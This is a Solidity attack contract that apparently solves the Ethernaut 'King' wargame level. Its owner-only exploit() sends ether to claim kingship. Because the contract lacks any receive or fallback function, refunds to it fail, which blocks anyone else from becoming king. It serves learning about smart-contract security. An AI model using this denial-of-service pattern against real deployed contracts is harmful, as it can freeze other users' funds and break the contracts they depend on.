// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IKing } from "ethernaut/09-king/IKing.sol";

contract KingAttacker is Ownable2Step {
    constructor() payable {
        // solhint-disable-previous-line no-empty-blocks
    }

    function exploit(address _kingAddr, uint256 _newPrize) external onlyOwner {
        // NB: minimalistic version without checking KingAttacker has the funds, or _newPrize is gte prize
        // solhint-disable-next-line avoid-low-level-calls
        (bool success,) = _kingAddr.call{value: _newPrize}("");
    }
}
